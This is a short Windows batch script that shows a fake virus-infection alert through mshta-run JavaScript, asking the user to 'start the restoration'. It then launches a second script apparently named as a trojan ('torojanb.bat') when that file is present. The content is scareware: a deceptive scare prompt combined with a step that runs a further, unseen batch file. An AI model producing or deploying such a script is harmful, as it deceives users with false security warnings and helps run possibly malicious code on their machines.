@echo off
set "TITLE=Your PC has been infected with a virus!"
set "MSG=Would you like to start the restoration?"

echo ^G

mshta "javascript:var r=confirm('%MSG%'); if(r){alert('Yes selected');} else {alert('No selected');}; close();"
if exist "torojanb.bat" (
    start "" "torojanb.bat"
) else (
    echo notorojanb.bat
)

pause
